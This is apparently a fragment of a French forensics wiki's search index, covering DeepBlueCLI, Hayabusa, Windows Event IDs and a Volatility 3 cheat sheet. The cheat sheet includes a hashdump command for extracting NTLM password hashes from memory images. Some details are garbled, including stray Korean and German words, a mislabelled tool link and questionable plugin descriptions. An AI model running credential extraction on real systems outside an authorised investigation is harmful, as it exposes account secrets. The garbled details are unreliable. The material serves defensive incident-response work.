<li>Birth (Created) Timestamp (b) : Le timestamp de naissance n'est pas mis \u00e0 jour lorsque le fichier est acc\u00e9d\u00e9.</li> </ul>"},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/","title":"DeepBlueCli","text":""},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/#analyse-de-journaux-devenements","title":"Analyse de Journaux d'\u00c9v\u00e9nements","text":""},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/#analyser-un-journal-devenements-specifique","title":"Analyser un journal d'\u00e9v\u00e9nements sp\u00e9cifique","text":"<pre><code>.\\DeepBlue.ps1 .\\chemin\\vers\\le\\fichier\\journal.evtx`\n</code></pre>"},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/#analyser-un-journal-devenements-depuis-un-serveur-distant","title":"Analyser un journal d'\u00e9v\u00e9nements depuis un serveur distant","text":"<pre><code>Get-WinEvent -LogName Security -ComputerName ServeurDistant | .\\DeepBlue.ps1\n</code></pre>"},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/#analyser-des-journaux-devenements-en-temps-reel","title":"Analyser des journaux d'\u00e9v\u00e9nements en temps r\u00e9el","text":"<pre><code>Get-WinEvent -LogName Security -MaxEvents 100 | .\\DeepBlue.ps1\n</code></pre>"},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/#analyser-les-derniers-evenements-dun-journal","title":"Analyser les derniers \u00e9v\u00e9nements d'un journal","text":"<pre><code>Get-WinEvent -LogName Security -MaxEvents 100 | .\\DeepBlue.ps1\n</code></pre>"},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/#analyse-specifique","title":"Analyse Sp\u00e9cifique","text":""},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/#analyser-pour-des-commandes-powershell-suspectes","title":"Analyser pour des commandes PowerShell suspectes","text":"<pre><code>.\\DeepBlue.ps1 -log PowerShell\n</code></pre>"},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/#analyser-pour-des-activites-suspectes-dans-les-journaux-de-securite","title":"Analyser pour des activit\u00e9s suspectes dans les journaux de s\u00e9curit\u00e9","text":"<pre><code>.\\DeepBlue.ps1 -log Security\n</code></pre>"},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/#analyser-pour-des-processus-suspects-dans-les-journaux-de-systeme","title":"Analyser pour des processus suspects dans les journaux de syst\u00e8me","text":"<pre><code>.\\DeepBlue.ps1 -log System\n</code></pre>"},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/#analyser-pour-des-activites-suspectes-dans-les-journaux-dapplication","title":"Analyser pour des activit\u00e9s suspectes dans les journaux d'application","text":"<pre><code>.\\DeepBlue.ps1 -log Application\n</code></pre>"},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/#filtrage-et-recherche","title":"Filtrage et Recherche","text":""},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/#analyser-en-filtrant-par-id-devenement","title":"Analyser en filtrant par ID d'\u00e9v\u00e9nement","text":"<pre><code>.\\DeepBlue.ps1 -log Security | Where-Object { $_.Id -eq 4625 }`\n</code></pre>"},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/#recherche-de-termes-specifiques-dans-les-resultats","title":"Recherche de termes sp\u00e9cifiques dans les r\u00e9sultats","text":"<pre><code>.\\DeepBlue.ps1 -log Security | Select-String -Pattern \"terme_recherch\u00e9\"\n</code></pre>"},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/#exportation-des-resultats","title":"Exportation des R\u00e9sultats","text":"<p>Exporter les r\u00e9sultats dans un fichier</p> <pre><code>.\\DeepBlue.ps1 -log Security | Out-File -FilePath .\\resultats_analyse.txt\n</code></pre>"},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/","title":"Hayabusa","text":"<p>Objectif : Hayabusa (\u96bc) est un outil rapide d'analyse de logs d'\u00e9v\u00e9nements Windows (<code>.evtx</code>), \u00e9crit en Rust. Il est con\u00e7u pour le Threat Hunting et l'Incident Response, en appliquant des r\u00e8gles de d\u00e9tection (principalement au format Sigma) pour identifier rapidement les activit\u00e9s suspectes ou malveillantes dans de grands volumes de logs.</p> <p>Source : https://github.com/Yamato-Security/hayabusa T\u00e9l\u00e9chargement : Des binaires pr\u00e9compil\u00e9s pour Windows, Linux et macOS sont disponibles sur la page Releases du projet GitHub.</p>"},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#utilisation-de-base","title":"\ud83d\ude80 Utilisation de Base","text":"<p>La structure g\u00e9n\u00e9rale d'une commande Hayabusa est : <code>hayabusa[.exe] [OPTIONS_GLOBALES] &lt;COMMANDE&gt; [OPTIONS_COMMANDE]</code></p>"},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#commandes-principales","title":"Commandes Principales","text":"<ul> <li><code>scan</code>: Analyse les logs et affiche les alertes d\u00e9tect\u00e9es selon les r\u00e8gles Sigma.</li> <li><code>csv-timeline</code>: G\u00e9n\u00e8re une timeline chronologique de tous les \u00e9v\u00e9nements (pas seulement les alertes) au format CSV.</li> <li><code>json-timeline</code>: G\u00e9n\u00e8re une timeline chronologique de tous les \u00e9v\u00e9nements au format JSON Lines.</li> <li><code>update-rules</code>: T\u00e9l\u00e9charge/met \u00e0 jour les r\u00e8gles Sigma depuis les d\u00e9p\u00f4ts configur\u00e9s.</li> <li><code>list-rules</code>: Liste les r\u00e8gles de d\u00e9tection charg\u00e9es.</li> <li><code>list-profiles</code>: Liste les profils de configuration disponibles.</li> </ul>"},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#options-dentree-input","title":"\ud83d\udce5 Options d'Entr\u00e9e (Input)","text":""},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#specifier-le-repertoire-des-logs","title":"Sp\u00e9cifier le R\u00e9pertoire des Logs","text":"<pre><code># Analyser tous les .evtx dans un dossier (et sous-dossiers)\n./hayabusa scan -d /chemin/vers/logs/\n# Exemple Windows: .\\hayabusa.exe scan -d C:\\Windows\\System32\\winevt\\Logs\\\n````\n\n- **Contexte :** Option la plus courante pour analyser l'ensemble des logs d'un syst\u00e8me. Hayabusa parcourt r\u00e9cursivement le dossier.\n\n\n#### Sp\u00e9cifier un Fichier Log Unique\n\n```bash\n./hayabusa scan -f /chemin/vers/un/log/specifique.evtx\n</code></pre> <ul> <li>Contexte : Analyser un seul fichier <code>.evtx</code>.</li> </ul>"},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#utiliser-un-profil-de-configuration","title":"Utiliser un Profil de Configuration","text":"<pre><code>./hayabusa scan -d /chemin/vers/logs/ -p &lt;nom_profil&gt;\n# Exemples: -p high, -p medium, -p verbose_level\n</code></pre> <ul> <li> <p>Contexte : Les profils pr\u00e9d\u00e9finis ajustent les r\u00e8gles et les niveaux de d\u00e9tection activ\u00e9s. <code>standard</code> est souvent le d\u00e9faut. <code>high</code> et <code>critical</code> se concentrent sur les alertes les plus graves. <code>verbose_level</code> inclut plus d'informations.</p> </li> <li> <p>Usage : Permet d'adapter rapidement le niveau de d\u00e9tail et de criticit\u00e9 de l'analyse. Utilisez <code>list-profiles</code> pour voir les profils disponibles.</p> </li> </ul>"},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#options-de-sortie-output","title":"\ud83d\udce4 Options de Sortie (Output)","text":""},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#scan-standard-sortie-console","title":"Scan Standard (Sortie Console)","text":"<pre><code>./hayabusa scan -d /chemin/vers/logs/\n</code></pre> <ul> <li>Contexte : Affiche les alertes d\u00e9tect\u00e9es directement dans la console, avec un r\u00e9sum\u00e9 final.</li> </ul>"},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#generer-une-timeline-csv","title":"G\u00e9n\u00e9rer une Timeline CSV","text":"<pre><code>./hayabusa csv-timeline -d /chemin/vers/logs/ -o timeline_output.csv\n</code></pre> <ul> <li> <p>Contexte : Cr\u00e9e un fichier CSV contenant tous les \u00e9v\u00e9nements des logs analys\u00e9s, tri\u00e9s chronologiquement. Tr\u00e8s utile pour une analyse d\u00e9taill\u00e9e et la corr\u00e9lation manuelle.</p> </li> <li> <p>Options :</p> <ul> <li><code>-o &lt;fichier&gt;</code> : Sp\u00e9cifie le fichier de sortie CSV.</li> </ul> </li> </ul>"},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#generer-une-timeline-json-lines","title":"G\u00e9n\u00e9rer une Timeline JSON Lines","text":"<pre><code>./hayabusa json-timeline -d /chemin/vers/logs/ -o timeline_output.jsonl\n</code></pre> <ul> <li> <p>Contexte : Similaire \u00e0 <code>csv-timeline</code>, mais g\u00e9n\u00e8re un fichier au format JSON Lines (un objet JSON par ligne), plus facile \u00e0 parser par d'autres outils.</p> </li> <li> <p>Options :</p> <ul> <li><code>-o &lt;fichier&gt;</code> : Sp\u00e9cifie le fichier de sortie JSONL.</li> </ul> </li> </ul>"},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#generer-un-rapport-html-timeline-graphique","title":"G\u00e9n\u00e9rer un Rapport HTML (Timeline Graphique)","text":"<pre><code># Combin\u00e9 avec une timeline CSV\n./hayabusa csv-timeline -d /chemin/vers/logs/ -o timeline.csv -H rapport_hayabusa.html\n\n# Combin\u00e9 avec une timeline JSON\n./hayabusa json-timeline -d /chemin/vers/logs/ -o timeline.jsonl -H rapport_hayabusa.html\n</code></pre> <ul> <li> <p>Contexte : L'option <code>-H &lt;fichier.html&gt;</code> (ou <code>--html-report</code>) g\u00e9n\u00e8re un rapport HTML interactif bas\u00e9 sur la timeline cr\u00e9\u00e9e (CSV ou JSON). Ce rapport permet de visualiser, filtrer et explorer les \u00e9v\u00e9nements et alertes de mani\u00e8re graphique.</p> </li> <li> <p>Usage : Tr\u00e8s pratique pour l'analyse visuelle et le reporting.</p> </li> </ul>"},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#autres-options-de-sortie-utiles","title":"Autres Options de Sortie Utiles","text":"<pre><code># Pour la commande 'scan'\n./hayabusa scan -d /logs/ -o resultats_scan.txt # Sauvegarder la sortie console dans un fichier\n./hayabusa scan -d /logs/ --no-summary # Ne pas afficher le r\u00e9sum\u00e9 final\n</code></pre>"},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#filtrage-et-tuning","title":"\u2699\ufe0f Filtrage et Tuning","text":""},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#filtrer-par-niveau-de-regle-sigma","title":"Filtrer par Niveau de R\u00e8gle Sigma","text":"<pre><code>./hayabusa scan -d /logs/ --min-level &lt;level&gt;\n# Levels: informational, low, medium, high, critical\n# Exemple: Afficher uniquement les alertes high et critical\n./hayabusa scan -d /logs/ --min-level high\n</code></pre> <ul> <li>Contexte : Permet de se concentrer sur les alertes les plus importantes en ignorant les niveaux inf\u00e9rieurs.</li> </ul>"},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#filtrer-par-event-id-windows","title":"Filtrer par Event ID Windows","text":"<pre><code># Analyser uniquement les \u00e9v\u00e9nements avec un ID sp\u00e9cifique\n./hayabusa scan -d /logs/ --eid 4624 # Scan pour l'Event ID 4624 (Logon r\u00e9ussi)\n\n# Exclure des Event IDs\n./hayabusa scan -d /logs/ --exclude-eid 4688,4689\n</code></pre> <ul> <li>Usage : Utile pour cibler des types d'\u00e9v\u00e9nements sp\u00e9cifiques lors d'une investigation.</li> </ul>"},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#filtrer-par-periode-temporelle","title":"Filtrer par P\u00e9riode Temporelle","text":"<pre><code># Sp\u00e9cifier une date/heure de d\u00e9but\n./hayabusa scan -d /logs/ --start \"YYYY-MM-DDTHH:MM:SS\"\n\n# Sp\u00e9cifier une date/heure de fin\n./hayabusa scan -d /logs/ --end \"YYYY-MM-DDTHH:MM:SS\"\n\n# Combiner d\u00e9but et fin\n./hayabusa scan -d /logs/ --start \"2024-04-01T00:00:00\" --end \"2024-04-01T23:59:59\"\n</code></pre> <ul> <li>Usage : Concentrer l'analyse sur une p\u00e9riode d'int\u00e9r\u00eat sp\u00e9cifique (ex: autour d'un incident).</li> </ul>"},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#utiliser-des-regles-sigma-specifiques","title":"Utiliser des R\u00e8gles Sigma Sp\u00e9cifiques","text":"<pre><code># Utiliser uniquement une r\u00e8gle sp\u00e9cifique\n./hayabusa scan -d /logs/ --rule /chemin/vers/ma/regle.yml\n\n# Utiliser uniquement les r\u00e8gles d'un dossier sp\u00e9cifique\n./hayabusa scan -d /logs/ --rule /chemin/vers/mon/dossier/de/regles/\n</code></pre> <ul> <li>Usage : Tester une nouvelle r\u00e8gle ou se concentrer sur un type de menace particulier.</li> </ul>"},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#regeln-gestion-des-regles-sigma","title":"Regeln Gestion des R\u00e8gles Sigma","text":""},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#mettre-a-jour-les-regles","title":"Mettre \u00e0 Jour les R\u00e8gles","text":"<pre><code>./hayabusa update-rules\n</code></pre> <ul> <li> <p>Contexte : T\u00e9l\u00e9charge les derni\u00e8res r\u00e8gles depuis les d\u00e9p\u00f4ts configur\u00e9s dans <code>config/rule-config.yml</code> (par d\u00e9faut, le d\u00e9p\u00f4t Sigma principal et celui de Hayabusa).</p> </li> <li> <p>Usage : Crucial \u00e0 faire r\u00e9guli\u00e8rement pour b\u00e9n\u00e9ficier des derni\u00e8res d\u00e9tections de menaces.</p> </li> </ul>"},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/#lister-les-regles-chargees","title":"Lister les R\u00e8gles Charg\u00e9es","text":"<pre><code>./hayabusa list-rules [--rule-level &lt;level&gt;] [--rule-status &lt;status&gt;]\n</code></pre> <ul> <li> <p>Contexte : Affiche les r\u00e8gles qui seront utilis\u00e9es par Hayabusa lors d'un scan.</p> </li> <li> <p>Usage : V\u00e9rifier quelles r\u00e8gles sont actives, filtrer par niveau (<code>high</code>, <code>critical</code>, etc.) ou statut (<code>stable</code>, <code>experimental</code>, etc.).</p> </li> </ul>"},{"location":"Blue%20Team/Forensic/Logs/Liste%20EventID/","title":"Liste EventID","text":"<p>4624: Succ\u00e8s de connexion - Indique un succ\u00e8s de connexion \u00e0 un compte.</p> <p>4625: \u00c9chec de connexion - Signale une tentative de connexion \u00e9chou\u00e9e, utile pour d\u00e9tecter des tentatives de force brute.</p> <p>4648: Utilisation explicite des identifiants - Utile pour suivre les connexions o\u00f9 des identifiants sont explicitement utilis\u00e9s.</p> <p>4672: Attribution de privil\u00e8ges sp\u00e9ciaux lors de la connexion - Indique qu'un utilisateur s'est connect\u00e9 avec des privil\u00e8ges administratifs.</p> <p>4688: Cr\u00e9ation d'un nouveau processus - Utile pour surveiller l'ex\u00e9cution de processus potentiellement malveillants.</p> <p>4720: Cr\u00e9ation d'un compte utilisateur - Indique la cr\u00e9ation d'un nouveau compte utilisateur.</p> <p>4728: Ajout d'un membre \u00e0 un groupe de s\u00e9curit\u00e9 global - Important pour surveiller les modifications des groupes de s\u00e9curit\u00e9.</p> <p>4732: Ajout d'un membre \u00e0 un groupe de s\u00e9curit\u00e9 local - Similaire \u00e0 l'ID 4728 mais pour les groupes locaux.</p> <p>4740: Compte d'utilisateur verrouill\u00e9 - Indique qu'un compte a \u00e9t\u00e9 verrouill\u00e9, souvent apr\u00e8s plusieurs tentatives de connexion \u00e9chou\u00e9es.</p> <p>4767: Compte d'utilisateur d\u00e9verrouill\u00e9 - Peut indiquer une activit\u00e9 administrative ou suspecte.</p> <p>4771: \u00c9chec de la validation Kerberos - Utile pour d\u00e9tecter des probl\u00e8mes d'authentification ou des tentatives d'attaque.</p> <p>4776: Validation d'identifiants - Surveillance des tentatives de connexion via le protocole NTLM.</p> <p>4781: Renommage d'un compte utilisateur - Peut indiquer une tentative de dissimulation ou de modification des droits d'acc\u00e8s.</p> <p>4798: Un utilisateur a effectu\u00e9 une requ\u00eate li\u00e9e \u00e0 un groupe - Utile pour surveiller les requ\u00eates li\u00e9es aux appartenances de groupe.</p> <p>4799: Un groupe de s\u00e9curit\u00e9 global a \u00e9t\u00e9 interrog\u00e9 - Compl\u00e9mentaire \u00e0 l'ID 4798 pour les groupes de s\u00e9curit\u00e9.</p>"},{"location":"Blue%20Team/Forensic/Memoire/Dump%20m%C3%A9moire/","title":"Dump m\u00e9moire","text":"<p>WinPmem : https://github.com/Velocidex/WinPmem</p> <p>DumpIT : https://www.magnetforensics.com/resources/magnet-dumpit-for-windows/</p> <p>Memdump : http://www.nirsoft.net/utils/nircmd.html</p> <p>LiME (linux) : https://github.com/504ensicsLabs/LiME</p>"},{"location":"Blue%20Team/Forensic/Memoire/Methodologie/","title":"Methodologie","text":"<ol> <li> <p>Identification et V\u00e9rification des Processus : Commen\u00e7ons par identifier tous les processus actifs. Les logiciels malveillants se d\u00e9guisent souvent en processus l\u00e9gitimes, parfois avec de l\u00e9g\u00e8res variations de noms pour \u00e9viter la d\u00e9tection. Nous devons :</p> <ul> <li>\u00c9num\u00e9rer tous les processus en cours d'ex\u00e9cution.</li> <li>D\u00e9terminer leur origine dans le syst\u00e8me d'exploitation.</li> <li>Les recouper avec les processus l\u00e9gitimes connus.</li> <li>Souligner toutes les divergences ou conventions de nommage suspectes.</li> </ul> </li> <li> <p>Examen Approfondi des Composants du Processus : Une fois que nous avons signal\u00e9 les processus potentiellement voyous, notre prochaine \u00e9tape est d'examiner les biblioth\u00e8ques de liens dynamiques (DLL) et les handles associ\u00e9s. Les logiciels malveillants exploitent souvent les DLL pour dissimuler leurs activit\u00e9s. Nous devrions :</p> <ul> <li>Examiner les DLL li\u00e9es au processus suspect.</li> <li>V\u00e9rifier l'existence de DLL non autoris\u00e9es ou malveillantes.</li> <li>Enqu\u00eater sur tout signe d'injection ou de d\u00e9tournement de DLL.</li> </ul> </li> <li> <p>Analyse de l'Activit\u00e9 R\u00e9seau : De nombreux types de logiciels malveillants, en particulier ceux qui op\u00e8rent par \u00e9tapes, n\u00e9cessitent une connectivit\u00e9 Internet. Ils peuvent se connecter \u00e0 des serveurs de commande et de contr\u00f4le (C2) ou exfiltrer des donn\u00e9es. Pour d\u00e9couvrir ces \u00e9l\u00e9ments :</p> <ul> <li>Examiner les connexions r\u00e9seau actives et passives dans la m\u00e9moire du syst\u00e8me.</li> <li>Identifier et documenter les adresses IP externes et les domaines associ\u00e9s.</li> <li>D\u00e9terminer la nature et le but de la communication.</li> <li>Valider la l\u00e9gitimit\u00e9 du processus.</li> <li>\u00c9valuer si le processus n\u00e9cessite normalement une communication r\u00e9seau.</li> <li>Remonter jusqu'au processus parent.</li> <li>\u00c9valuer son comportement et sa n\u00e9cessit\u00e9.</li> </ul> </li> <li> <p>D\u00e9tection d'Injection de Code : Les adversaires avanc\u00e9s utilisent souvent des techniques telles que le vidage de processus ou l'utilisation de sections de m\u00e9moire non mapp\u00e9es. Pour contrer cela, nous devrions :</p> <ul> <li>Utiliser des outils d'analyse de la m\u00e9moire pour d\u00e9tecter des anomalies ou des signes de ces techniques.</li> <li>Identifier tout processus qui semble occuper des espaces m\u00e9moire inhabituels ou pr\u00e9senter des comportements inattendus.</li> </ul> </li> <li> <p>D\u00e9couverte de Rootkits : Atteindre la discr\u00e9tion et la persistance est un objectif commun pour les adversaires. Les rootkits, qui s'incrustent profond\u00e9ment dans le syst\u00e8me d'exploitation, accordent aux acteurs de la menace un acc\u00e8s continu, souvent \u00e9lev\u00e9, au syst\u00e8me tout en \u00e9chappant \u00e0 la d\u00e9tection. Pour aborder cela :</p> <ul> <li>Rechercher des signes d'activit\u00e9 de rootkit ou de modifications profondes du syst\u00e8me d'exploitation.</li> <li>Identifier tout processus ou pilote op\u00e9rant avec des privil\u00e8ges anormalement \u00e9lev\u00e9s ou pr\u00e9sentant des comportements de dissimulation.</li> </ul> </li> <li> <p>Extraction d'\u00c9l\u00e9ments Suspects : Apr\u00e8s avoir identifi\u00e9 des processus, pilotes ou ex\u00e9cutables suspects, nous devons les isoler pour une analyse approfondie. Cela implique :</p> <ul> <li>Extraire les composants suspects de la m\u00e9moire.</li> <li>Les stocker en toute s\u00e9curit\u00e9 pour un examen ult\u00e9rieur \u00e0 l'aide d'outils forensiques sp\u00e9cialis\u00e9s.</li> </ul> </li> </ol>"},{"location":"Blue%20Team/Forensic/Memoire/CheatSheets/Volatility3/","title":"Volatility 3 Cheatsheet","text":"<p>Objectif : Volatility est un framework open-source de r\u00e9f\u00e9rence pour l'analyse de la m\u00e9moire volatile (RAM) et l'investigation num\u00e9rique (forensic). Volatility 3 est une r\u00e9\u00e9criture en Python 3, qui ne n\u00e9cessite plus de profils syst\u00e8me sp\u00e9cifiques comme Volatility 2, car il utilise des tables de symboles et tente de d\u00e9tecter automatiquement l'OS.</p> <p>Source : https://github.com/volatilityfoundation/volatility3 Installation : <code>pip install volatility3</code> (ou cloner le d\u00e9p\u00f4t et installer les d\u00e9pendances)</p>"},{"location":"Blue%20Team/Forensic/Memoire/CheatSheets/Volatility3/#utilisation-de-base","title":"\ud83d\ude80 Utilisation de Base","text":"<p>La structure g\u00e9n\u00e9rale d'une commande Volatility 3 est : <code>python vol.py -f &lt;chemin_image_memoire&gt; &lt;plugin&gt; [options_plugin]</code></p> <ul> <li><code>-f &lt;chemin_image_memoire&gt;</code> : Obligatoire. Sp\u00e9cifie le fichier de dump m\u00e9moire \u00e0 analyser (ex: <code>memory.dmp</code>, <code>memdump.mem</code>, <code>memory.raw</code>).</li> <li><code>&lt;plugin&gt;</code> : Le plugin sp\u00e9cifique \u00e0 ex\u00e9cuter (ex: <code>windows.pslist.PsList</code>). Volatility 3 utilise une structure <code>OS.module.Classe</code>.</li> <li><code>[options_plugin]</code> : Options sp\u00e9cifiques au plugin choisi (ex: <code>--pid</code>, <code>--dump</code>).</li> </ul>"},{"location":"Blue%20Team/Forensic/Memoire/CheatSheets/Volatility3/#aide-et-informations","title":"Aide et Informations","text":"<pre><code># Afficher l'aide g\u00e9n\u00e9rale et la liste des plugins disponibles\npython vol.py -h\n\n# Afficher l'aide pour un plugin sp\u00e9cifique\npython vol.py &lt;plugin&gt; -h\n# Exemple: python vol.py windows.pslist.PsList -h\n\n# Tenter d'identifier l'OS et les tables de symboles appropri\u00e9es\npython vol.py -f &lt;image&gt; frameworkinfo.FrameworkInfo\n# Alternative plus cibl\u00e9e (recommand\u00e9e) :\npython vol.py -f &lt;image&gt; banners.Banners # Tente d'identifier via des signatures connues\npython vol.py -f &lt;image&gt; layerwriter.LayerWriter # Tente d'identifier la couche OS\n</code></pre> <p>[!Astuce] Volatility 3 tente de d\u00e9tecter automatiquement l'OS. Si cela \u00e9choue, vous devrez peut-\u00eatre fournir manuellement les tables de symboles (moins courant que les profils de Volatility 2).</p>"},{"location":"Blue%20Team/Forensic/Memoire/CheatSheets/Volatility3/#plugins-windows-windows","title":"\uc708\ub3c4\uc6b0 Plugins Windows (<code>windows.*</code>)","text":""},{"location":"Blue%20Team/Forensic/Memoire/CheatSheets/Volatility3/#analyse-des-processus","title":"Analyse des Processus","text":"<pre><code># Lister les processus actifs (similaire au Gestionnaire des t\u00e2ches)\npython vol.py -f &lt;image&gt; windows.pslist.PsList\n\n# Lister les processus en incluant ceux termin\u00e9s ou cach\u00e9s (scan plus profond)\npython vol.py -f &lt;image&gt; windows.psscan.PsScan\n\n# Afficher l'arborescence des processus (relations parent/enfant)\npython vol.py -f &lt;image&gt; windows.pstree.PsTree\n\n# Afficher la ligne de commande utilis\u00e9e pour lancer chaque processus\npython vol.py -f &lt;image&gt; windows.cmdline.CmdLine\n\n# Lister les DLL charg\u00e9es par chaque processus\npython vol.py -f &lt;image&gt; windows.dlllist.DllList\n\n# Lister les modules charg\u00e9s dans le noyau et les processus\npython vol.py -f &lt;image&gt; windows.modules.Modules\n\n# Lister les handles ouverts par processus (fichiers, cl\u00e9s de registre, etc.)\npython vol.py -f &lt;image&gt; windows.handles.Handles [--pid &lt;PID&gt;]\n\n# Afficher les variables d'environnement des processus\npython vol.py -f &lt;image&gt; windows.envars.Envars [--pid &lt;PID&gt;]\n</code></pre> <ul> <li>Interpr\u00e9tation : Comparez <code>pslist</code> et <code>psscan</code> pour trouver des processus cach\u00e9s (pr\u00e9sents dans <code>psscan</code> mais pas <code>pslist</code>). Examinez <code>pstree</code> pour des relations parent/enfant suspectes (ex: <code>svchost.exe</code> lanc\u00e9 par <code>explorer.exe</code>). V\u00e9rifiez <code>cmdline</code> pour des arguments inhabituels. <code>dlllist</code> peut r\u00e9v\u00e9ler des DLL inject\u00e9es. <code>handles</code> montre les ressources utilis\u00e9es par un processus.</li> </ul>"},{"location":"Blue%20Team/Forensic/Memoire/CheatSheets/Volatility3/#analyse-reseau","title":"Analyse R\u00e9seau","text":"<pre><code># Lister les connexions r\u00e9seau actives et en \u00e9coute (similaire \u00e0 netstat)\npython vol.py -f &lt;image&gt; windows.netscan.NetScan\n\n# Lister les sockets ouverts\npython vol.py -f &lt;image&gt; windows.sockets.Sockets\n\n# Lister les informations r\u00e9seau d\u00e9taill\u00e9es (inclut plus que netscan)\npython vol.py -f &lt;image&gt; windows.netstat.NetStat\n</code></pre> <ul> <li>Interpr\u00e9tation : Recherchez des connexions vers des adresses IP externes suspectes, des ports inhabituels en \u00e9coute, ou des processus syst\u00e8me communiquant sur le r\u00e9seau alors qu'ils ne le devraient pas.</li> </ul>"},{"location":"Blue%20Team/Forensic/Memoire/CheatSheets/Volatility3/#analyse-du-registre","title":"Analyse du Registre","text":"<pre><code># Lister les ruches (hives) du registre charg\u00e9es en m\u00e9moire\npython vol.py -f &lt;image&gt; windows.registry.hivelist.HiveList\n\n# Afficher les cl\u00e9s et valeurs d'une ruche sp\u00e9cifique (n\u00e9cessite l'offset de la ruche obtenu via hivelist)\npython vol.py -f &lt;image&gt; windows.registry.printkey.PrintKey --hive-offset &lt;offset&gt; [--key &lt;chemin_cle&gt;]\n\n# Rechercher des cl\u00e9s de persistance (Run, RunOnce, etc.)\n# (N\u00e9cessite souvent de cibler les ruches NTUSER.DAT ou SOFTWARE)\npython vol.py -f &lt;image&gt; windows.registry.printkey.PrintKey --hive-offset &lt;offset_ruche_user_ou_software&gt; --key \"Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\n\n# Extraire les hashes de mots de passe depuis les ruches SAM et SYSTEM\npython vol.py -f &lt;image&gt; windows.hashdump.Hashdump [--sam-offset &lt;offset&gt;] [--system-offset &lt;offset&gt;]\n# Note: Les offsets sont souvent n\u00e9cessaires si plusieurs ruches sont trouv\u00e9es.\n\n# Afficher l'historique UserAssist (programmes lanc\u00e9s par l'utilisateur via l'interface graphique)\npython vol.py -f &lt;image&gt; windows.registry.userassist.UserAssist\n</code></pre> <ul> <li>Interpr\u00e9tation : <code>hivelist</code> est la premi\u00e8re \u00e9tape pour trouver les ruches. <code>printkey</code> permet d'explorer des cl\u00e9s sp\u00e9cifiques (ex: persistance, configuration). <code>hashdump</code> est crucial pour r\u00e9cup\u00e9rer les hashes NTLM locaux. <code>userassist</code> montre l'activit\u00e9 r\u00e9cente de l'utilisateur.</li> </ul>"},{"location":"Blue%20Team/Forensic/Memoire/CheatSheets/Volatility3/#analyse-du-systeme-de-fichiers-en-memoire","title":"Analyse du Syst\u00e8me de Fichiers (en M\u00e9moire)","text":"<pre><code># Scanner la m\u00e9moire \u00e0 la recherche d'objets fichiers\npython vol.py -f &lt;image&gt; windows.filescan.FileScan\n\n# Dumper des fichiers sp\u00e9cifiques trouv\u00e9s avec filescan (bas\u00e9 sur leur offset m\u00e9moire)\npython vol.py -f &lt;image&gt; windows.dumpfiles.DumpFiles --virtaddr &lt;offset_fichier&gt; --output-dir &lt;dossier_sortie&gt;\n# Alternative : dumper bas\u00e9 sur le nom (peut \u00eatre moins fiable)\n# python vol.py -f &lt;image&gt; windows.dumpfiles.DumpFiles --physaddr &lt;offset_physique&gt; --name-regex \".*\\\\.exe\" -D &lt;dossier_sortie&gt;\n</code></pre> <ul> <li>Interpr\u00e9tation : <code>filescan</code> peut trouver des fichiers qui \u00e9taient ouverts ou r\u00e9cemment utilis\u00e9s, y compris des ex\u00e9cutables malveillants ou des fichiers supprim\u00e9s encore pr\u00e9sents en m\u00e9moire. <code>dumpfiles</code> permet de les extraire pour une analyse plus approfondie.</li> </ul>"},{"location":"Blue%20Team/Forensic/Memoire/CheatSheets/Volatility3/#analyse-kernel-et-malware","title":"Analyse Kernel et Malware","text":"<pre><code># Rechercher des signes d'injection de code dans les processus\npython vol.py -f &lt;image&gt; windows.malfind.Malfind [--pid &lt;PID&gt;] [--dump-dir &lt;dossier_sortie&gt;]\n\n# Lister les drivers charg\u00e9s (modules noyau)\npython vol.py -f &lt;image&gt; windows.modules.Modules\n\n# V\u00e9rifier les hooks dans la table d'appels syst\u00e8me (SSDT)\npython vol.py -f &lt;image&gt; windows.ssdt.SSDT\n\n# Afficher les informations de version des fichiers (utile pour v\u00e9rifier l'authenticit\u00e9)\npython vol.py -f &lt;image&gt; windows.verinfo.VerInfo [--pid &lt;PID&gt;]\n</code></pre> <ul> <li>Interpr\u00e9tation : <code>malfind</code> est puissant pour d\u00e9tecter du code inject\u00e9 (shellcode, PE inject\u00e9s) en recherchant des permissions m\u00e9moire suspectes (RWX) ou des en-t\u00eates PE anormaux. <code>modules</code> et <code>ssdt</code> aident \u00e0 identifier des rootkits ou des drivers malveillants.</li> </ul>"},{"location":"Blue%20Team/Forensic/Memoire/CheatSheets/Volatility3/#extraction-de-donnees","title":"Extraction de Donn\u00e9es","text":"<pre><code># Dumper la m\u00e9moire d'un processus sp\u00e9cifique\npython vol.py -f &lt;image&gt; windows.memmap.Memmap --pid &lt;PID&gt; --dump --output-dir &lt;dossier_sortie&gt;\n# Alternative:\n# 